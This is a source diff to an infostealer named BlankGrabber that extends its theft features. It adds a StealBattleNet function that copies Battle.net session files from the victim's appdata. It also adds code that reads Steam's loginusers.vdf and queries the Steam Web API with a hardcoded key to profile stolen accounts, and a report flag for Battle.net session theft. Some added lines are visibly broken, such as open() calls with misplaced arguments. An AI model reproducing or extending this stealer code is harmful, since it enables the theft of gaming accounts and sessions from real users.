@@ -904,6 +904,7 @@ class BlankGrabber:
     SteamStolen: bool = False # Indicates whether Steam account was stolen or not
     EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
+    BattleNetStolen: bool = False # Indicates whether Battle.Net account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
     def __init__(self) -> None: # Constructor to call all the functions
@@ -931,6 +932,7 @@ class BlankGrabber:
             (self.StealGrowtopia, False),
             (self.StealSteam, False),
             (self.StealUplay, False),
+            (self.StealBattleNet, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
             (self.GetTaskList, False),
@@ -1100,6 +1102,26 @@ class BlankGrabber:
             if self.SteamStolen and multiple:
                 with open(os.path.join(saveToPath, "Info.txt"), "w") as file:
                     file.write("Multiple Steam installations are found, so the files for each of them are put in different Profiles")
+            http = PoolManager(cert_reqs="CERT_NONE") # Steam Account checking, useful for checking steam profiles without having to sign in.
+            with open(steamConfigPath, "loginusers.vdf", "r", encoding="utf-8") as file:
+                accounts = file.read()
+            account_ids = re.findall(r"7656[0-9]{13}", accounts)
+            def get_account_info(account_id):
+                api_key = "440D7F4D810EF9298D25EDDF37C1F902" # using official steam web api
+                response = http.request('GET', f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={api_key}&steamids={account_id}")
+                account_info = json.loads(response.data)['response']['players'][0]
+                response = http.request('GET', f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key={api_key}&steamid={account_id}")
+                games = json.loads(response.data)['response']
+                response = http.request('GET', f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key={api_key}&steamid={account_id}")
+                level = json.loads(response.data)['response']
+                return account_info, games, level
+            for account_id in account_ids: # just in case we grab more than one steam account
+                account_info, games, level = get_account_info(account_id)
+                with open(os.path.join(saveToPath, "AccountInfo(DO NOT COPY)", f"{account_id}.txt", "w")) as output_file:
+                    output_file.write("Until I implement a function to translate appid to an actual name, use this link to check for game titles manually. Use CRTL + F and search for the appid.\nhttps://api.steampowered.com/ISteamApps/GetAppList/v0002/?format=json")
+                    output_file.write("Account Info:\n" + json.dumps(account_info, indent=2))
+                    output_file.write("\n\nGames:\n" + json.dumps(games, indent=2))
+                    output_file.write("\n\nAccount Level:\n" + json.dumps(level, indent=2))
     
     @Errors.Catch
     def StealUplay(self) -> None: # Steals Uplay accounts
@@ -1113,7 +1135,19 @@ class BlankGrabber:
                         os.makedirs(saveToPath, exist_ok= True)
                         shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                         self.UplayStolen = True
-    
+
+    @Errors.Catch
+    def StealBattleNet(self) -> None: #Steal Battle.Net accounts
+        if Settings.CaptureGames:
+            Logger.info("Stealing Battle.Net session")
+            saveToPath = os.path.join(self.TempFolder, "Games", "Battle.Net")
+            battlePath = os.path.join(os.getenv("appdata"), "Battle.net")
+            if os.path.isdir(battlePath):
+                for item in os.listdir(battlePath):
+                    if os.path.isfile(os.path.join(battlePath, item)):
+                        os.makedirs(saveToPath, exist_ok= True)
+                        shutil.copy(os.path.join(battlePath, item), os.path.join(saveToPath, item))
+                        self.BattleNetStolen = True
     @Errors.Catch
     def StealRobloxCookies(self) -> None: # Steals Roblox cookies
         if Settings.CaptureGames:
@@ -1619,6 +1653,7 @@ class BlankGrabber:
             "Epic Session" : "Yes" if self.EpicStolen else "No",
             "Steam Session" : "Yes" if self.SteamStolen else "No",
             "Uplay Session" : "Yes" if self.UplayStolen else "No",
+            "Battle.Net Session" : "Yes" if self.BattleNetStolen else "No",
             "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
             "Screenshot" : "Yes" if self.ScreenshotTaken else "No",
             "System Info" : "Yes" if self.SystemInfoStolen else "No"
